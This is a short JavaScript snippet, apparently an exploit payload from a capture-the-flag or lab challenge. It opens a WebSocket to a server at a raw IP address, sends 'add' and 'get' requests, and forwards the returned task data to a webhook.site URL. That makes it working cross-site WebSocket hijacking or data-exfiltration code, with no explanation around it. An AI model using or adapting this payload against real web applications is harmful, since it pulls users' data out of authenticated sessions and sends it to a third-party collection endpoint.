const ws = new WebSocket(`ws://178.62.9.40:31123/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify({ action: 'add' }))
    ws.send(JSON.stringify({ action: 'get' }))
}

ws.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    if (data.success) {
        if (data.action === 'get') {
            fetch("https://webhook.site/1026e8f2-ab1c-44c9-8440-9b30c70169bb/" + JSON.stringify(data.tasks ))
        }
        else if (data.action === 'add') {
        }
    }
}
